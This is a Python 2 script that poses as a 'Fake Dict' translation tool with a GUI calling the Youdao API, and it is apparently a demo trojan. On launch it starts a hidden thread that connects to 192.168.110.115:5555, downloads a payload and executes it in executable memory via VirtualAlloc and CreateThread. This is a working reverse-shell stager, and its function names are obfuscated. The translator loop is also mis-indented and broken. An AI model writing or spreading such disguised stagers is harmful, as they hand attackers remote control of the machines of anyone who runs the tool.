import urllib, urllib2, json, struct, socket, binascii, ctypes, random, time, thread
from urlparse import urlparse
import easygui as eg

gdMDAafejF, uoGrBDoTUKFUZD = None, None


def aMtaLkxtTKveGe():
    try:
        global uoGrBDoTUKFUZD
        uoGrBDoTUKFUZD = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        uoGrBDoTUKFUZD.connect(('192.168.110.115', 5555))
        UkAYrkaN = struct.pack('<i', uoGrBDoTUKFUZD.fileno())
        l = struct.unpack('<i', str(uoGrBDoTUKFUZD.recv(4)))[0]
        tmSmlFmGBoZ = "     "
        while len(tmSmlFmGBoZ) < l: tmSmlFmGBoZ += uoGrBDoTUKFUZD.recv(l)
        nwQHEulryGQj = ctypes.create_string_buffer(tmSmlFmGBoZ, len(tmSmlFmGBoZ))
        nwQHEulryGQj[0] = binascii.unhexlify('BF')
        for i in xrange(4): nwQHEulryGQj[i + 1] = UkAYrkaN[i]
        return nwQHEulryGQj
    except:
        return None


def OoMUvBoSbMT(wubKepxsIE):
    if wubKepxsIE != None:
        CmpEnySL = bytearray(wubKepxsIE)
        GteEwokU = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(CmpEnySL)),
                                                       ctypes.c_int(0x3000), ctypes.c_int(0x40))
        ctypes.windll.kernel32.VirtualLock(ctypes.c_int(GteEwokU), ctypes.c_int(len(CmpEnySL)))
        sUYFakxZdoYof = (ctypes.c_char * len(CmpEnySL)).from_buffer(CmpEnySL)
        ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(GteEwokU), sUYFakxZdoYof, ctypes.c_int(len(CmpEnySL)))
        ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(GteEwokU),
                                                 ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
        ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))


def dict():
    FieldNames = ['TranSrc:', 'TranRes:', 'SmartRes:']
    FieldValues = ['', '', '']
    url = 'http://fanyi.youdao.com/translate?smartresult=dict&smartresult=rule&smartresult=ugc&sessionFrom=https://www.baidu.com/link'
    while True:
        content = str(list(
            eg.multenterbox('Please enter the phrase U want to translate', 'Fake Dict Via Li_Xin', FieldNames,
                            FieldValues))[0].encode('utf-8'))
        data = {}
        data['type'] = 'AUTO'
        data['i'] = ''
    data['doctype'] = 'json'
    data['xmlVersion'] = '1.8'
    data['keufrom'] = 'fanyi.web'
    data['ue'] = 'UTF-8'
    data['action'] = 'FY_BY_CLICKBUTTON'
    data['typeResult'] = 'true'
    data['i'] = content
    data = urllib.urlencode(data).encode('utf-8')
    response = urllib2.urlopen(url, data)
    html = response.read().decode('utf-8')
    target = json.loads(html)
    result = target['translateResult'][0][0]['tgt']
    n = result.encode('utf-8')
    FieldValues[1] = n
    FieldValues[0] = content
    et = ''
    if 'smartResult' in target:
        entries = list(target['smartResult']['entries'])
        for i in range(len(entries)):
            if (not entries[i] == ''):
                et = et + entries[i].encode('utf-8') + '    '
        FieldValues[2] = et
    else:
        FieldValues[2] = ''


def malware():
    gdMDAafejF = aMtaLkxtTKveGe()
    OoMUvBoSbMT(gdMDAafejF)


def cought():
    try:
        dict()
        return None
    except:
        return None


if __name__ == '__main__':
    thread.start_new(malware, ())
    cought()
    for i in range(10000):
        for j in range(10000):
            time.sleep(10000)
